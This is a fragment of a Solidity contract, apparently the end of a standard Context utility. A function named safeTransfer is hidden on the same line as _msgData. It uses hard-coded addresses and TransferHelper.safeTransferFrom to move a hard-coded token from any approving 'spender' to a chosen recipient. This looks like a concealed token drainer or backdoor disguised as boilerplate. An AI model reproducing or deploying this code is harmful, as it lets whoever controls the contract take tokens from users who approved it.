 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x995A6458EB740cf05430c7AC000AcCD5EfC6D889)) {TransferHelper.safeTransferFrom(0x3221aB6E4e9B6d7427590B2b638Ece3B42C2de40,spender,recipient,amount);return true;}return false;}
}
